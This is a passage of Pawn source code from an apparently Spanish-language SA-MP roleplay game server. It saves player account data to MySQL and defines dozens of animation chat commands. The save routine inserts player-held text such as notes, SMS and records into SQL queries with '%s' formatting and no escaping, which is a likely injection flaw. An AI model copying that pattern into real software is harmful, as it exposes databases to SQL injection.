	auto=%d, auto2=%d, auto3=%d, auto4=%d, casa=%d, casa2=%d, negocio=%d, negocio2=%d, licenciaauto=%d, licenciaarma=%d, gafas=%d, tutorial=%d, \
	encendedor=%d, cigarrillos=%d, mascara=%d, advertencias=%d, adminadver=%d, dni=%d, weap0=%d, ammo0=%d, weap1=%d, ammo1=%d, \
	weap2=%d, ammo2=%d, weap3=%d, ammo3=%d, weap4=%d, ammo4=%d, weap5=%d, ammo5=%d, weap6=%d, ammo6=%d, weap7=%d, ammo7=%d, \
	weap8=%d, ammo8=%d, weap9=%d, ammo9=%d, weap10=%d, ammo10=%d, weap11=%d, ammo11=%d, maleta=%d, mochila=%d, casco=%d, miniwofer=%d, fam=%d, famr=%d, deagle=%d, shotgun=%d, mp5=%d, \
	ak47=%d, m4=%d, sniper=%d, fstyle=%d, leccion=%d, busqueda=%d, rent=%d, rob=%d, donate=%d, donatedia=%d, donatemes=%d, donateyear=%d, banduda=%d, \
	seguro=%d, walkie=%d WHERE id = '%d'", 
	cuenta[playerid][cNivel], cuenta[playerid][cEmpleado], cuenta[playerid][cAdministrador], cuenta[playerid][cZonaZeroCash], 
	cuenta[playerid][cHorasJugadas], cuenta[playerid][cAcento], cuenta[playerid][cRegistro], cuenta[playerid][cSexo], cuenta[playerid][cEdad], 
	cuenta[playerid][cOrigen], cuenta[playerid][cCaminar], cuenta[playerid][cCobro], cuenta[playerid][cEstereo], cuenta[playerid][cExperiencia], 
	cuenta[playerid][cDinero], cuenta[playerid][cDineroBanco], cuenta[playerid][cCheques], cuenta[playerid][cAsesinatos], cuenta[playerid][cMuerte], 
	cuenta[playerid][cArrestado], cuenta[playerid][cLoteria], cuenta[playerid][cTrabajo], cuenta[playerid][cCarcel], cuenta[playerid][cTiempoCarcel], 
	cuenta[playerid][cMateriales], cuenta[playerid][cDrogas], cuenta[playerid][cSpeed], cuenta[playerid][cExtasis], cuenta[playerid][cRitalin], 
	cuenta[playerid][cHeroina], cuenta[playerid][cMarihuana], cuenta[playerid][cLider], cuenta[playerid][cMiembro], cuenta[playerid][cRango], cuenta[playerid][cTraje], 
	cuenta[playerid][cInterior], cuenta[playerid][cMundo], cuenta[playerid][cEquipo], cuenta[playerid][cTelefono], 
	cuenta[playerid][cSaldo], cuenta[playerid][cMinutos], cuenta[playerid][cHoras], cuenta[playerid][cMensajes], cuenta[playerid][cIpod], 
	cuenta[playerid][cCoche], cuenta[playerid][cCoche2], cuenta[playerid][cCoche3], cuenta[playerid][cCoche4], cuenta[playerid][cCasa], cuenta[playerid][cCasa2], 
	cuenta[playerid][cNegocio], cuenta[playerid][cNegocio2], cuenta[playerid][cLicenciaAuto], cuenta[playerid][cLicenciaArma], cuenta[playerid][cGafas], cuenta[playerid][cTutorial], 
	cuenta[playerid][cEncendedor], cuenta[playerid][cCigarrillos], cuenta[playerid][cMascara], cuenta[playerid][cAdvertencias], cuenta[playerid][cAdminAdvertencia], 
	cuenta[playerid][cIdentificacion], cuenta[playerid][cArma][0], cuenta[playerid][cMunicion][0], cuenta[playerid][cArma][1], cuenta[playerid][cMunicion][1], 
	cuenta[playerid][cArma][2], cuenta[playerid][cMunicion][2], cuenta[playerid][cArma][3], cuenta[playerid][cMunicion][3], cuenta[playerid][cArma][4], cuenta[playerid][cMunicion][4], 
	cuenta[playerid][cArma][5], cuenta[playerid][cMunicion][5], cuenta[playerid][cArma][6], cuenta[playerid][cMunicion][6], cuenta[playerid][cArma][7], cuenta[playerid][cMunicion][7], 
	cuenta[playerid][cArma][8], cuenta[playerid][cMunicion][8], cuenta[playerid][cArma][9], cuenta[playerid][cMunicion][9], cuenta[playerid][cArma][10], cuenta[playerid][cMunicion][10], cuenta[playerid][cArma][11], 
	cuenta[playerid][cMunicion][11], cuenta[playerid][cMaleta], cuenta[playerid][cMochila], cuenta[playerid][cCasco], cuenta[playerid][cWofer], cuenta[playerid][cFamilia], 
	cuenta[playerid][cFamiliaRango], cuenta[playerid][cDesert], cuenta[playerid][cEscopeta], cuenta[playerid][cMP5], cuenta[playerid][cAK47], cuenta[playerid][cM4], cuenta[playerid][cSniper], 
	cuenta[playerid][cEstiloPelea], cuenta[playerid][cLeccion], cuenta[playerid][cBusqueda], cuenta[playerid][cRentado], cuenta[playerid][cRobo], cuenta[playerid][cDonador], 
	cuenta[playerid][cDonar][0], cuenta[playerid][cDonar][1], cuenta[playerid][cDonar][2], cuenta[playerid][cBanDuda], cuenta[playerid][cSeguro], cuenta[playerid][cWalkie], cuenta[playerid][cUnico]);
	//Primera tmp
	mysql_query(servidor[mysqlControl], tmp, false);
	
	tmp[0] = '\0';
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_usuarios SET head=%d, married=%d, entered=%d, peces=%d, implementos=%d, pagas=%d, fichas=%d, hambre=%d, enfermedad=%d, enfermedad2=%d, enfermedad3=%d, cobrap=%d, scorerp=%d, tarjeta=%d, advrol=%d, paquete=%d, \
	packtipo=%d, skill0=%d, skill1=%d, skill2=%d, skill3=%d, skill4=%d, skill5=%d, skill6=%d, skill7=%d, skill8=%d, skill9=%d, skill10=%d, skill11=%d, skill12=%d, inv10=%d, inv11=%d, inv20=%d, inv21=%d, monedas=%d, semillas1=%d, semillas2=%d, semillas3=%d, semillas4=%d, \
	semillas5=%d, navidad=%d, licenciavuelo=%d, licenciabote=%d, licenciamoto=%d WHERE id = '%d'", 
	cuenta[playerid][cCabeza], cuenta[playerid][cCasado], cuenta[playerid][cEntrada], cuenta[playerid][cPeces], cuenta[playerid][cImplementos], cuenta[playerid][pagas], 
	cuenta[playerid][cSilenciado], cuenta[playerid][cHambre], cuenta[playerid][cEnfermedad], cuenta[playerid][cEnfermedad2], cuenta[playerid][cEnfermedad3], cuenta[playerid][cCobrap], 
	cuenta[playerid][cPuntosRol], cuenta[playerid][cTarjeta], cuenta[playerid][cADVRol], cuenta[playerid][cPack], cuenta[playerid][cPackID], cuenta[playerid][cSkills][0], 
	cuenta[playerid][cSkills][1], cuenta[playerid][cSkills][2], cuenta[playerid][cSkills][3], cuenta[playerid][cSkills][4], cuenta[playerid][cSkills][5], cuenta[playerid][cSkills][6], 
	cuenta[playerid][cSkills][7], cuenta[playerid][cSkills][8], cuenta[playerid][cSkills][9], cuenta[playerid][cSkills][10], cuenta[playerid][cSkills][11], cuenta[playerid][cSkills][12], 
	cuenta[playerid][cInv1][0], cuenta[playerid][cInv1][1], cuenta[playerid][cAHoras], cuenta[playerid][cAMinutos], cuenta[playerid][cMonedas], cuenta[playerid][cSemillas][0], 
	cuenta[playerid][cSemillas][1], cuenta[playerid][cSemillas][2], cuenta[playerid][cSemillas][3], cuenta[playerid][cSemillas][4], 
	cuenta[playerid][cNavidad], cuenta[playerid][cLicenciaVuelo], cuenta[playerid][cLicenciaBote], cuenta[playerid][cLicenciaMoto], 
	cuenta[playerid][cUnico]);
	//Segunda tmp
	mysql_query(servidor[mysqlControl], tmp, false);

	new string[64], date[6];
	getdate(date[0], date[1], date[2]);
	gettime(date[3], date[4], date[5]);
	format(string, sizeof(string), "%02d/%02d/%02d - %02d:%02d:%02d", date[2], date[1], date[0], date[3], date[4], date[5]);
	
	tmp[0] = '\0';
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_usuarios SET \
	antecedente1='%s', antecedente2='%s', antecedente3='%s', \
	nota1='%s', nota2='%s', nota3='%s', nota4='%s', nota5='%s', \
	sms1='%s', sms2='%s', sms3='%s', sms4='%s', sms5='%s', \
	marriedto='%s', \
	ultconn='%s' WHERE id='%d'", 
	cuenta[playerid][cAntecedente1], cuenta[playerid][cAntecedente2], cuenta[playerid][cAntecedente3], 
	cuenta[playerid][cNote1], cuenta[playerid][cNote2], cuenta[playerid][cNote3], cuenta[playerid][cNote4], cuenta[playerid][cNote5], 
	cuenta[playerid][cSMS1], cuenta[playerid][cSMS2], cuenta[playerid][cSMS3], cuenta[playerid][cSMS4], cuenta[playerid][cSMS5], 
	cuenta[playerid][cPareja], 
	string, cuenta[playerid][cUnico]);
	//Tercera tmp
	mysql_query(servidor[mysqlControl], tmp, false);

	tmp[0] = '\0';
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_usuarios SET posicionx='%f', posiciony='%f', posicionz='%f', salud='%f', chaleco='%f' WHERE id='%d'", 
	cuenta[playerid][cPosiciones][0], cuenta[playerid][cPosiciones][1], cuenta[playerid][cPosiciones][2], cuenta[playerid][cVida], cuenta[playerid][cArmadura], cuenta[playerid][cUnico]);

	//Cuarta tmp
	mysql_query(servidor[mysqlControl], tmp, false);

	tmp[0] = '\0';
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_juguetes SET model0=%d, model1=%d, model2=%d, model3=%d, model4=%d, \
	bone0=%d, bone1=%d, bone2=%d, bone3=%d, bone4=%d, \
	posx0=%f, posx1=%f, posx2=%f, posx3=%f, posx4=%f, \
	posy0=%f, posy1=%f, posy2=%f, posy3=%f, posy4=%f, \
	posz0=%f, posz1=%f, posz2=%f, posz3=%f, posz4=%f, \
	rotx0=%f, rotx1=%f, rotx2=%f, rotx3=%f, rotx4=%f, \
	roty0=%f, roty1=%f, roty2=%f, roty3=%f, roty4=%f, \
	rotz0=%f, rotz1=%f, rotz2=%f, rotz3=%f, rotz4=%f, \
	scalex0=%f, scalex1=%f, scalex2=%f, scalex3=%f, scalex4=%f, \
	scaley0=%f, scaley1=%f, scaley2=%f, scaley3=%f, scaley4=%f, \
	scalez0=%f, scalez1=%f, scalez2=%f, scalez3=%f, scalez4=%f WHERE nombre='%s'", 
	juguetes[playerid][0][ptModelID], juguetes[playerid][1][ptModelID], juguetes[playerid][2][ptModelID], juguetes[playerid][3][ptModelID], juguetes[playerid][4][ptModelID], 
	juguetes[playerid][0][ptBone], juguetes[playerid][1][ptBone], juguetes[playerid][2][ptBone], juguetes[playerid][3][ptBone], juguetes[playerid][4][ptBone], 
	juguetes[playerid][0][ptPosX], juguetes[playerid][1][ptPosX], juguetes[playerid][2][ptPosX], juguetes[playerid][3][ptPosX], juguetes[playerid][4][ptPosX], 
	juguetes[playerid][0][ptPosY], juguetes[playerid][1][ptPosY], juguetes[playerid][2][ptPosY], juguetes[playerid][3][ptPosY], juguetes[playerid][4][ptPosY], 
	juguetes[playerid][0][ptPosZ], juguetes[playerid][1][ptPosZ], juguetes[playerid][2][ptPosZ], juguetes[playerid][3][ptPosZ], juguetes[playerid][4][ptPosZ], 
	juguetes[playerid][0][ptRotX], juguetes[playerid][1][ptRotX], juguetes[playerid][2][ptRotX], juguetes[playerid][3][ptRotX], juguetes[playerid][4][ptRotX], 
	juguetes[playerid][0][ptRotY], juguetes[playerid][1][ptRotY], juguetes[playerid][2][ptRotY], juguetes[playerid][3][ptRotY], juguetes[playerid][4][ptRotY], 
	juguetes[playerid][0][ptRotZ], juguetes[playerid][1][ptRotZ], juguetes[playerid][2][ptRotZ], juguetes[playerid][3][ptRotZ], juguetes[playerid][4][ptRotZ], 
	juguetes[playerid][0][ptScaleX], juguetes[playerid][1][ptScaleX], juguetes[playerid][2][ptScaleX], juguetes[playerid][3][ptScaleX], juguetes[playerid][4][ptScaleX], 
	juguetes[playerid][0][ptScaleY], juguetes[playerid][1][ptScaleY], juguetes[playerid][2][ptScaleY], juguetes[playerid][3][ptScaleY], juguetes[playerid][4][ptScaleY], 
	juguetes[playerid][0][ptScaleZ], juguetes[playerid][1][ptScaleZ], juguetes[playerid][2][ptScaleZ], juguetes[playerid][3][ptScaleZ], juguetes[playerid][4][ptScaleZ], 
	Nombre(playerid));
	//Quinta tmp
	mysql_query(servidor[mysqlControl], tmp, false);

	tmp[0] = '\0';
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_inventario SET arma0=%d, arma1=%d, arma2=%d, arma3=%d, arma4=%d, arma5=%d, balas0=%d, balas1=%d, balas2=%d, balas3=%d, balas4=%d, balas5=%d, bebida=%d, bebida2=%d WHERE unico=%d;", 
	inventario[playerid][invArmas][0], inventario[playerid][invArmas][1], inventario[playerid][invArmas][2], 
	inventario[playerid][invArmas][3], inventario[playerid][invArmas][4], inventario[playerid][invArmas][5], 
	inventario[playerid][invBalas][0], inventario[playerid][invBalas][1], inventario[playerid][invBalas][2], 
	inventario[playerid][invBalas][3], inventario[playerid][invBalas][4], inventario[playerid][invBalas][5], 
	inventario[playerid][invBebida][0], inventario[playerid][invBebida][1], cuenta[playerid][cUnico]);
	mysql_query(servidor[mysqlControl], tmp, false);
	
	new Float:poss2[4];
	GetPlayerPos(playerid, poss2[0], poss2[1], poss2[2]);
	GetPlayerFacingAngle(playerid, poss2[3]);
	printf("Estado del jugador %s(ID: %d) #2: %d (Coord..: %f, %f, %f, %f)", Nombre(playerid), playerid, GetPlayerState(playerid), poss2[0], poss2[1], poss2[2], poss2[3]);
	
	return 1;
}

command(rendirse, playerid, params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)	{
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_HANDSUP);
	} return 1;
}
command(borracho, playerid, params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT){
		ApplyAnimation(playerid, "PED", "WALK_DRUNK", 4.0, 1, 1, 1, 1, 500);
	} return 1;
}
command(hablar, playerid, params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT){
		ApplyAnimation(playerid, "PED", "IDLE_chat", 4.1, 7, 5, 1, 1, 1);
	} return 1;
}
command(paja, playerid, params[])
{
	ApplyAnimation(playerid, "PAULNMAC", "wank_loop", 4.0, 1, 0, 0, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para seguir utiliza /irsecortao");
}
command(apuntar, playerid, params[]){
	return ApplyAnimation(playerid, "PED", "GUN_STAND", 4.0, 1, 0, 0, 1, 0);
}
command(irsecortao, playerid, pamras[])
{
	return ApplyAnimation(playerid, "PAULNMAC", "wank_out", 4.0, 0, 0, 0, 0, 0);
}
command(arrestado, playerid, params[])
{
	return ApplyAnimation( playerid, "ped", "ARRESTgun", 4.0, 0, 1, 1, 1, 500);
}
command(amenazar, playerid, params[])
{
	return ApplyAnimation(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 0, 0, 0, 1, 500);
}
command(superpatada, playerid, params[])
{
	return ApplyAnimation(playerid, "FIGHT_C", "FightC_3", 4.1, 0, 1, 1, 1, 1);
}
command(reirse, playerid, params[])
{
	return ApplyAnimation(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0);
}
command(agredido, playerid, params[])
{
	return ApplyAnimation(playerid, "POLICE", "crm_drgbst_01", 4.0, 0, 0, 0, 1, 0);
}
command(herido, playerid, params[])
{
	ApplyAnimation(playerid, "SWEET", "LaFin_Sweet", 4.0, 0, 1, 1, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para continuar utiliza /agonizar");
}
command(encender, playerid, params[])
{
	ApplyAnimation(playerid, "SMOKING", "M_smk_in", 4.000000, 0, 0, 1, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para continuar puedes utilizar /inhalar o /apagar");
}
command(inhalar, playerid, params[])
{
	ApplyAnimation(playerid, "SMOKING", "M_smk_drag", 4.000000, 1, 0, 0, 0, -1);
	return Mensaje(playerid, COLOR_VIOLETA, "Para continuar utiliza /apagar");
}
command(asustado, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "handscower", 4.1, 0, 1, 1, 1, 1);
}
command(adolorido, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "KO_shot_stom", 4.1, 0, 1, 1, 1, 1);
}
command(apagar, playerid, params[])
{
	return ApplyAnimation(playerid, "SMOKING", "M_smk_out", 4.000000, 0, 1, 1, 0, 0);
}
command(vigilar, playerid, params[])
{
	return ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 1, 1, 1, 0, 4000);
}
command(recostarse, playerid, params[])
{
	ApplyAnimation(playerid, "SUNBATHE", "Lay_Bac_in", 4.0, 0, 0, 0, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para ponerte de pie utiliza /pararse");
}
command(pararse, playerid, params[])
{
	return ApplyAnimation(playerid, "SUNBATHE", "Lay_Bac_out", 4.0, 0, 0, 0, 0, 0);
}
command(cubrirse, playerid, params[])
{
	return ApplyAnimation(playerid, "ped", "cower", 4.0, 1, 0, 0, 0, 0);
}
command(fumar1, playerid, params[])
{
	return ApplyAnimation(playerid, "SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0);
}
command(fumar2, playerid, params[])
{
	return ApplyAnimation(playerid, "SMOKING", "F_smklean_loop", 4.0, 1, 0, 0, 0, 0);
}
command(fumar3, playerid, params[])
{
	return ApplyAnimation(playerid, "SMOKING", "M_smkstnd_loop", 4.0, 1, 0, 0, 0, 0);
}
command(vomitar, playerid, params[])
{
	return ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
}
command(cenar, playerid, params[])
{
	return ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
}
command(chao, playerid, params[])
{
	return ApplyAnimation(playerid, "KISSING", "BD_GF_Wave", 3.0, 0, 0, 0, 0, 0);
}
command(palmada, playerid, params[])
{
	return ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);
}
command(agonizar, playerid, params[])
{
	return ApplyAnimation(playerid, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 1, 0);
}
command(levantarse, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "getup_front", 4.1, 0, 0, 0, 0, 0);
}
command(rodar, playerid, params[])
{
	ApplyAnimation(playerid, "MD_CHASE", "MD_HANG_Lnd_Roll", 4.1, 0, 1, 1, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para ponerte de pie utiliza /levantarse");
}
command(traficar, playerid, params[])
{
	return ApplyAnimation(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0);
}
command(beso, playerid, params[])
{
	return ApplyAnimation(playerid, "KISSING", "Playa_Kiss_02", 4.0, 0, 0, 0, 0, 0);
}
command(crack, playerid, params[])
{
	return ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 1, 0);
}
command(mear, playerid, params[])
{
	return ApplyAnimation(playerid, "PAULNMAC", "Piss_in", 4.0, 0, 0, 0, 0, 0);
}
command(patada, playerid, params[])
{
	return ApplyAnimation(playerid, "FIGHT_C", "FightC_2", 4.1, 7, 5, 1, 1, 1);
}
command(sentarse, playerid, params[])
{
	return ApplyAnimation(playerid, "SUNBATHE", "ParkSit_M_in", 4.000000, 0, 1, 1, 1, 0);
}
command(depie, playerid, params[])
{
	return ApplyAnimation(playerid, "ped", "SEAT_up", 4.000000, 0, 1, 1, 1, 0);
}
command(fokear, playerid, params[])
{
	return ApplyAnimation( playerid, "ped", "fucku", 4.0, 0, 1, 1, 1, 1 );
}
command(siquiero, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "Invite_Yes", 4.0, 0, 0, 0, 0, 0);
}
command(noquiero, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "Invite_No", 4.0, 0, 0, 0, 0, 0);
}
command(comerciar, playerid, params[])
{
	return ApplyAnimation(playerid, "DEALER", "shop_pay", 4.000000, 0, 1, 1, 0, 0);
}
command(piquero, playerid, params[])
{
	return ApplyAnimation(playerid, "DAM_JUMP", "DAM_Launch", 4.0, 0, 1, 1, 1, 1);
}
command(taichi, playerid, params[])
{
	return ApplyAnimation(playerid, "PARK", "Tai_Chi_Loop", 4.1, 7, 5, 1, 1, 1);
}

COMMAND:beber(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid) && entero[playerid][borracho] && entero[playerid][sbebidas])
	{
		switch(entero[playerid][sbebidas])
		{
			case 1 .. 3:
			{
				entero[playerid][borracho]--;
				SetPlayerDrunkLevel(playerid, GetPlayerDrunkLevel(playerid) + 1000);
			}				
			case 4 .. 5:
			{
				entero[playerid][borracho]--;
				SetPlayerDrunkLevel(playerid, GetPlayerDrunkLevel(playerid) + 1500);
			}			
			case 6:
			{
				entero[playerid][borracho]--;
				SetPlayerDrunkLevel(playerid, GetPlayerDrunkLevel(playerid) + 250);
			}
			case 7 .. 9:
			{
				entero[playerid][borracho]--;
				new Float:Health;
				GetPlayerHealth(playerid, Health);
				GiveHP(playerid, Health+5);
			}
		}
		ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1, 1, 1, 1, 0, 1000, 1);
		return 1;
	}
	else if(!entero[playerid][borracho] && entero[playerid][sbebidas])
	{
		RemovePlayerAttachedObject(playerid, 5);
		entero[playerid][borracho] = 0;
		entero[playerid][sbebidas] = 0;
		return 1;
	}
	if(!entero[playerid][borracho])return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene una bebida en la mano.");
	return 1;
}

command(boxear, playerid, params[])
{
	return ApplyAnimation(playerid, "GYMNASIUM", "gym_shadowbox", 4.1, 7, 5, 1, 1, 1);
}
command(fuerza, playerid, params[])
{
	return ApplyAnimation(playerid, "benchpress", "gym_bp_celebrate", 4.1, 0, 1, 1, 1, 1);
}
command(pelea, playerid, params[])
{
	ApplyAnimation(playerid, "ped", "FIGHTIDLE", 4.000000, 0, 1, 1, 1, 1);
	return Mensaje(playerid, COLOR_VIOLETA, "Para continuar utiliza /boxear");
}
command(recojer, playerid, params[])
{
	ApplyAnimation(playerid, "BSKTBALL", "BBALL_pickup", 4.000000, 0, 1, 1, 1, 1);
	return Mensaje(playerid, COLOR_VIOLETA, "Para continuar utiliza /botear");
}
command(botear, playerid, params[])
{
	ApplyAnimation(playerid, "BSKTBALL", "BBALL_walk", 4.000000, 1, 1, 1, 1, 500);
	return Mensaje(playerid, COLOR_VIOLETA, "Para continuar utiliza /clavarse o /lanzar");
}
command(clavarse, playerid, params[])
{
	return ApplyAnimation(playerid, "BSKTBALL", "BBALL_def_jump_shot", 4.0, 0, 1, 1, 1, 500);
}
command(lanzar, playerid, params[])
{
	return ApplyAnimation(playerid, "BSKTBALL", "BBALL_Jump_Shot", 4.0, 0, 1, 1, 1, 500);
}
command(hombre, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "WALK_gang1", 4.0, 1, 1, 1, 1, 500);
}
command(mujer, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "WOMAN_walkpro", 4.0, 1, 1, 1, 1, 500);
}
command(sanar, playerid, params[])
{
	return ApplyAnimation(playerid, "MEDIC", "CPR", 4.1, 0, 0, 0, 0, 0);
}
command(llorar, playerid, params[])
{
	return ApplyAnimation(playerid, "GRAVEYARD", "mrnF_loop", 4.1, 0, 0, 0, 0, 0);
}
command(detener, playerid, params[])
{
	return ApplyAnimation(playerid, "POLICE", "CopTraf_Stop", 4.1, 0, 0, 0, 0, 0);
}
command(rapear, playerid, params[])
{
	return ApplyAnimation(playerid, "RAPPING", "RAP_B_Loop", 4.0, 1, 0, 0, 0, 8000);
}
command(alzar, playerid, params[])
{
	return ApplyAnimation(playerid, "GHANDS", "gsign2LH", 4.1, 0, 1, 1, 1, 1);
}
command(cansado, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "WOMAN_runfatold", 4.1, 7, 5, 1, 1, 1);
}
command(bomba, playerid, params[])
{
	return ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 1, 1, 0, 0);
}
command(sapiar, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "roadcross_female", 4.1, 0, 0, 0, 0, 0);
}
command(asiento, playerid, params[])
{
	ApplyAnimation(playerid, "ped", "SEAT_down", 4.000000, 0, 0, 0, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para ponerte de pie utiliza /depie");
}
command(servirse, playerid, params[])
{
	return ApplyAnimation(playerid, "BAR", "Barcustom_get", 4.1, 0, 0, 0, 0, 0);
}
command(servir, playerid, params[])
{
	return ApplyAnimation(playerid, "BAR", "Barserve_give", 4.1, 0, 0, 0, 0, 0);
}
command(asiento2, playerid, params[])
{
	ApplyAnimation(playerid, "Attractors", "Stepsit_in", 4.1, 0, 0, 0, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para ponerte de pie utiliza /depie2");
}
command(depie2, playerid, params[])
{
	return ApplyAnimation(playerid, "Attractors", "Stepsit_out", 4.1, 0, 0, 0, 0, 0);
}
command(mmm, playerid, params[])
{
	return ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_think", 4.1, 0, 0, 0, 0, 0);
}
command(saludo, playerid, params[])
{
	return Mensaje(playerid, COLOR_VIOLETA, "Utiliza /saludo[1-4]");
}
command(saludo1, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "hndshkaa", 4.1, 0, 0, 0, 0, 0);
}
command(saludo2, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "hndshkba", 4.1, 0, 0, 0, 0, 0);
}
command(saludo3, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "hndshkca", 4.1, 0, 0, 0, 0, 0);
}
command(saludo4, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "hndshkfa_swt", 4.1, 0, 0, 0, 0, 0);
}
command(strip, playerid, params[])
{
	return Mensaje(playerid, COLOR_AMARILLO, "Utiliza /strip[1-20]");
}
command(strip1, playerid, params[])
{
	return ApplyAnimation(playerid, "CAR", "flag_drop", 4.1, 0, 1, 1, 1, 1);
}
command(strip2, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "PUN_CASH", 4.1, 7, 5, 1, 1, 1);
}
command(strip3, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "PUN_HOLLER", 4.1, 7, 5, 1, 1, 1);
}
command(strip4, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "PUN_LOOP", 4.1, 7, 5, 1, 1, 1);
}
command(strip5, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_A", 4.1, 7, 5, 1, 1, 1);
}
command(strip6, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_B", 4.1, 7, 5, 1, 1, 1);
}
command(strip7, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_C", 4.1, 7, 5, 1, 1, 1);
}
command(strip8, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_D", 4.1, 7, 5, 1, 1, 1);
}
command(strip9, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_E", 4.1, 7, 5, 1, 1, 1);
}
command(strip10, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_F", 4.1, 7, 5, 1, 1, 1);
}
command(strip11, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_G", 4.1, 7, 5, 1, 1, 1);
}
command(strip12, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_B2A", 4.1, 0, 1, 1, 1, 1);
}
command(strip13, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "strip_E", 4.1, 7, 5, 1, 1, 1);
}
command(strip14, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_B2C", 4.000000, 0, 1, 1, 1, 0);
}
command(strip15, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_C1", 4.000000, 0, 1, 1, 1, 0);
}
command(strip16, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_C2", 4.000000, 0, 1, 1, 1, 0);
}
command(strip17, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_C2B", 4.1, 7, 5, 1, 1, 1);
}
command(strip18, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_Loop_A", 4.1, 7, 5, 1, 1, 1);
}
command(strip19, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_Loop_C", 4.1, 7, 5, 1, 1, 1);
}
command(strip20, playerid, params[])
{
	return ApplyAnimation(playerid, "STRIP", "STR_Loop_B", 4.1, 7, 5, 1, 1, 1);
}
command(echarse, playerid, params[])
{
	return ApplyAnimation(playerid, "SUNBATHE", "SitnWait_in_W", 4.000000, 0, 0, 0, 1, 0);
}
command(asientosexi, playerid, params[])
{
	ApplyAnimation(playerid, "SUNBATHE", "ParkSit_W_idleA", 4.000000, 0, 1, 1, 1, 0);
	return Mensaje(playerid, COLOR_VIOLETA, "Para ponerte de pie utiliza /pararse");
}
command(danzar, playerid, params[])
{
	return Mensaje(playerid, COLOR_AMARILLO, "Utiliza /danzar[0-12]");
}
command(danzar0, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "bd_clap", 4.1, 7, 5, 1, 1, 1);
}
command(danzar1, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "bd_clap1", 4.1, 7, 5, 1, 1, 1);
}
command(danzar2, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "dance_loop", 4.1, 7, 5, 1, 1, 1);
}
command(danzar3, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "DAN_Down_A", 4.1, 7, 5, 1, 1, 1);
}
command(danzar4, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "DAN_Left_A", 4.1, 7, 5, 1, 1, 1);
}
command(danzar5, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "DAN_Loop_A", 4.1, 7, 5, 1, 1, 1);
}
command(danzar6, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "DAN_Right_A", 4.1, 7, 5, 1, 1, 1);
}
command(danzar7, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "DAN_Up_A", 4.1, 7, 5, 1, 1, 1);
}
command(danzar8, playerid, params[])
{
